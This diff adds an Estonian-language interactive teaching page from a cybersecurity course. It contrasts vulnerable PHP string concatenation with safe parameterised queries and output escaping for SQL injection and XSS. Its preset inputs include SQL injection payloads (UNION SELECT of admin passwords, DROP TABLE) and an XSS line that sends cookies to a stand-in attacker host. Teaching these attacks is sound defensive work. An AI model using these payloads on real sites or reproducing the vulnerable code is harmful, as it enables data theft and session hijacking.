@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="et">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQL-süst ja XSS – interaktiivne näide</title>
+<style>
+:root{--bg:#fff;--card:#f6f5f1;--text:#1f1f1d;--muted:#6b6a65;--border:#d6d4cc;--accent-bg:#e6f1fb;--accent:#0c447c;
+--data-bg:#e1f5ee;--data:#085041;--code-bg:#fcebeb;--code:#791f1f;--code-line:#e24b4a;--ok:#3b6d11;--bad:#a32d2d;
+--mono:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",monospace}
+@media (prefers-color-scheme:dark){:root{--bg:#1c1c1b;--card:#262624;--text:#ecebe6;--muted:#a3a29c;--border:#44443f;
+--accent-bg:#0c447c;--accent:#b5d4f4;--data-bg:#085041;--data:#9fe1cb;--code-bg:#791f1f;--code:#f7c1c1;--ok:#97c459;--bad:#f09595}}
+body{font-family:system-ui,-apple-system,"Segoe UI",sans-serif;background:var(--bg);color:var(--text);max-width:780px;margin:2rem auto;padding:0 1rem;line-height:1.6}
+h1{font-size:24px;font-weight:500}
+h2{font-size:19px;font-weight:500;margin-top:2.5rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+nav a{color:var(--accent);margin-right:16px}
+.lbl{font-size:13px;color:var(--muted);margin:0 0 6px}
+input{width:100%;box-sizing:border-box;height:38px;padding:0 10px;font-family:var(--mono);font-size:14px;border:1px solid var(--border);border-radius:8px;background:var(--bg);color:var(--text)}
+button{font-size:13px;padding:5px 10px;border:1px solid var(--border);border-radius:8px;background:transparent;color:var(--text);cursor:pointer;font-family:var(--mono)}
+button:hover{background:var(--card)}
+.presets{display:flex;flex-wrap:wrap;gap:8px;margin:10px 0 1.25rem}
+.panel{background:var(--card);border-radius:12px;padding:1rem 1.25rem;margin-bottom:1rem}
+.mono{font-family:var(--mono);font-size:14px;line-height:1.8;white-space:pre-wrap;word-break:break-all}
+.src{color:var(--muted);font-size:13px}
+.u-data{background:var(--data-bg);color:var(--data);border-radius:3px}
+.u-code{background:var(--code-bg);color:var(--code);border-radius:3px;outline:1px solid var(--code-line)}
+.cmt{color:var(--muted);text-decoration:line-through}
+.q{background:var(--accent-bg);color:var(--accent);border-radius:3px;padding:0 4px}
+.legend{display:flex;gap:16px;font-size:13px;color:var(--muted);flex-wrap:wrap}
+.browser{background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.browser .bar{font-size:12px;color:var(--muted);padding:4px 10px;border-bottom:1px solid var(--border)}
+.browser iframe{width:100%;height:70px;border:0;display:block;background:#fff}
+.verdict{font-size:14px;margin:8px 0 0}
+</style>
+</head>
+<body>
+<h1>Veebirünnakud: proovi ise</h1>
+<nav><a href="https://github.com/valdonolvak/Operatsioonis-steemi-ja-k-berturbe-alused/blob/main/peatykid/24-kuberturbe-pohimoisted.md#xss">← Peatükk 24</a><a href="#sqli">SQL-süst</a><a href="#xss">XSS</a></nav>
+<p>Mõlemal rünnakul on sama põhjus: <strong>kasutaja sisend kleebitakse teksti sisse, mida keegi teine (andmebaas või brauser) tõlgendab koodina.</strong> Vali näide või kirjuta oma sisend.</p>
+
+<!-- ============ SQL INJECTION ============ -->
+<h2 id="sqli">1. SQL-süst</h2>
+<p class="lbl">Kasutaja sisend ($_GET['nimi'])</p>
+<input id="sql-inp" type="text" value="' OR '1'='1" aria-label="SQL-näite sisend">
+<div class="presets" id="sql-presets"></div>
+
+<div class="panel">
+  <p class="lbl">⚠ Ohtlik: string kleebitakse kokku, andmebaas saab ühe teksti</p>
+  <div class="mono src">$sql = "SELECT * FROM users WHERE name = '" . $_GET['nimi'] . "'";</div>
+  <p class="lbl" style="margin-top:10px">Andmebaas saab:</p>
+  <div class="mono" id="sql-bad"></div>
+  <p class="verdict" id="sql-badv"></p>
+</div>
+
+<div class="panel">
+  <p class="lbl">✓ Turvaline: päring ja väärtus liiguvad eraldi</p>
+  <div class="mono src">$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
+$stmt->execute([$_GET['nimi']]);</div>
+  <p class="lbl" style="margin-top:10px">1. prepare() saadab struktuuri</p>
+  <div class="mono">SELECT * FROM users WHERE name = <span class="q">?</span></div>
+  <p class="lbl" style="margin-top:10px">2. execute() saadab väärtuse eraldi</p>
+  <div class="mono"><span class="u-data" id="sql-good" style="padding:2px 6px"></span></div>
+  <p class="verdict" style="color:var(--ok)">✓ Andmebaas otsib kasutajat, kelle nimi on täpselt see tekst. Ülakomad on tavalised märgid.</p>
+</div>
+
+<!-- ============ XSS ============ -->
+<h2 id="xss">2. XSS (cross-site scripting)</h2>
+<p class="lbl">Kasutaja kommentaar ($_POST['kommentaar'])</p>
+<input id="xss-inp" type="text" value="<img src=x onerror=alert(document.cookie)>" aria-label="XSS-näite sisend">
+<div class="presets" id="xss-presets"></div>
+
+<div class="panel">
+  <p class="lbl">⚠ Ohtlik: kommentaar kleebitakse HTML-i sisse</p>
+  <div class="mono src">echo "&lt;p&gt;" . $kommentaar . "&lt;/p&gt;";</div>
+  <p class="lbl" style="margin-top:10px">Brauser saab HTML-i:</p>
+  <div class="mono" id="xss-bad"></div>
+  <p class="lbl" style="margin-top:10px">Brauser näitab (skriptid on siin näites blokeeritud):</p>
+  <div class="browser"><div class="bar">teine kasutaja vaatab kommentaare</div><iframe id="xss-bad-view" sandbox="" title="Ohtliku väljundi eelvaade"></iframe></div>
+  <p class="verdict" id="xss-badv"></p>
+</div>
+
+<div class="panel">
+  <p class="lbl">✓ Turvaline: erimärgid kodeeritakse enne väljastamist</p>
+  <div class="mono src">echo "&lt;p&gt;" . htmlspecialchars($kommentaar, ENT_QUOTES, 'UTF-8') . "&lt;/p&gt;";</div>
+  <p class="lbl" style="margin-top:10px">Brauser saab HTML-i:</p>
+  <div class="mono" id="xss-good"></div>
+  <p class="lbl" style="margin-top:10px">Brauser näitab:</p>
+  <div class="browser"><div class="bar">teine kasutaja vaatab kommentaare</div><iframe id="xss-good-view" sandbox="" title="Turvalise väljundi eelvaade"></iframe></div>
+  <p class="verdict" style="color:var(--ok)">✓ &lt; ja &gt; muutusid &amp;lt; ja &amp;gt; märkideks. Brauser näitab neid tekstina, mitte ei loe neid sildina.</p>
+</div>
+
+<div class="legend">
+  <span><span class="u-data" style="padding:0 6px">abc</span> sisend jäi andmeks</span>
+  <span><span class="u-code" style="padding:0 6px">abc</span> sisend muutus koodiks</span>
+  <span><span class="cmt">abc</span> välja kommenteeritud</span>
+</div>
+
+<script>
+const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+function presets(id,list,inp,fn){const el=document.getElementById(id);list.forEach(p=>{const b=document.createElement('button');b.textContent=p;b.onclick=()=>{inp.value=p;fn()};el.appendChild(b)})}
+
+/* ---- SQL ---- */
+const sqlInp=document.getElementById('sql-inp');
+function runSql(){
+  const u=sqlInp.value,A="SELECT * FROM users WHERE name = '",B="'";
+  const s=A+u+B,orig=[];
+  for(let i=0;i<s.length;i++)orig.push(i>=A.length&&i<A.length+u.length?'u':'t');
+  let inStr=false,cm=false,cls=[];
+  for(let i=0;i<s.length;i++){
+    if(cm){cls.push('c');continue}
+    const c=s[i];
+    if(!inStr&&c==='-'&&s[i+1]==='-'){cm=true;cls.push('c');continue}
+    if(c==="'"){cls.push('q');inStr=!inStr;continue}
+    cls.push(inStr?'d':'k');
+  }
+  let h='',codeUsed=false;
+  for(let i=0;i<s.length;i++){
+    const k=cls[i],ch=esc(s[i]);
+    if(k==='c'){h+='<span class="cmt">'+ch+'</span>';continue}
+    if(orig[i]==='u'){const isCode=(k==='k'||k==='q');if(isCode)codeUsed=true;h+='<span class="'+(isCode?'u-code':'u-data')+'">'+ch+'</span>'}
+    else h+=ch;
+  }
+  document.getElementById('sql-bad').innerHTML=h;
+  const v=document.getElementById('sql-badv');
+  if(inStr&&!cm){v.style.color='var(--bad)';v.textContent='✗ Ülakomad jäid paaritult. Päring katkeb süntaksiveaga, ja juba see annab ründajale vihje.'}
+  else if(codeUsed){v.style.color='var(--bad)';v.textContent='✗ Punane osa ei ole enam nimi. Andmebaas täidab selle SQL-käsuna.'}
+  else{v.style.color='var(--ok)';v.textContent='✓ Seekord läks hästi, sest sisendis polnud ülakoma.'}
+  document.getElementById('sql-good').textContent=u===''?' ':u;
+}
+presets('sql-presets',["mari","' OR '1'='1","' UNION SELECT kasutaja, parool FROM admins -- ","O'Brien","'; DROP TABLE users; -- "],sqlInp,runSql);
+sqlInp.addEventListener('input',runSql);runSql();
+
+/* ---- XSS ---- */
+const xssInp=document.getElementById('xss-inp');
+const hsc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;');
+const frameDoc=b=>'<!DOCTYPE html><html><body style="font-family:system-ui,sans-serif;font-size:15px;margin:10px;color:#1f1f1d">'+b+'</body></html>';
+function runXss(){
+  const u=xssInp.value;
+  /* ohtlik: märgi sildid punaseks, tekst roheliseks */
+  const parts=u.split(/(<[^>]*>?)/);let h='&lt;p&gt;',tags=false;
+  parts.forEach(p=>{if(!p)return;const isTag=p[0]==='<';if(isTag)tags=true;h+='<span class="'+(isTag?'u-code':'u-data')+'">'+esc(p)+'</span>'});
+  h+='&lt;/p&gt;';
+  document.getElementById('xss-bad').innerHTML=h;
+  document.getElementById('xss-bad-view').srcdoc=frameDoc('<p>'+u+'</p>');
+  const v=document.getElementById('xss-badv');
+  const m=u.match(/<script[^>]*>([\s\S]*?)(<\/script>|$)/i)||u.match(/\bon\w+\s*=\s*["']?([^"'>]+)/i)||u.match(/javascript:([^"'>]+)/i);
+  if(m){v.style.color='var(--bad)';v.textContent='✗ Päris lehel käivitaks brauser iga külastaja juures: '+m[1].trim()+'. Skript töötab lehe nimel ja pääseb ligi küpsistele, sessioonile ja lehe sisule.'}
+  else if(tags){v.style.color='var(--bad)';v.textContent='✗ Skripti pole, aga sisend muutis lehe struktuuri. Sama auk lubab ka skripti.'}
+  else{v.style.color='var(--ok)';v.textContent='✓ Seekord läks hästi, sest sisendis polnud < märki.'}
+  const enc=hsc(u);
+  document.getElementById('xss-good').innerHTML='&lt;p&gt;<span class="u-data">'+esc(enc)+'</span>&lt;/p&gt;';
+  document.getElementById('xss-good-view').srcdoc=frameDoc('<p>'+enc+'</p>');
+}
+presets('xss-presets',["Tore artikkel!","<b>väga</b> tore","<script>fetch('https://ryndaja.ee/?c='+document.cookie)<\/script>","<img src=x onerror=alert(document.cookie)>","<a href=\"javascript:alert(1)\">Vajuta siia</a>"],xssInp,runXss);
+xssInp.addEventListener('input',runXss);runXss();
+</script>
+</body>
+</html>
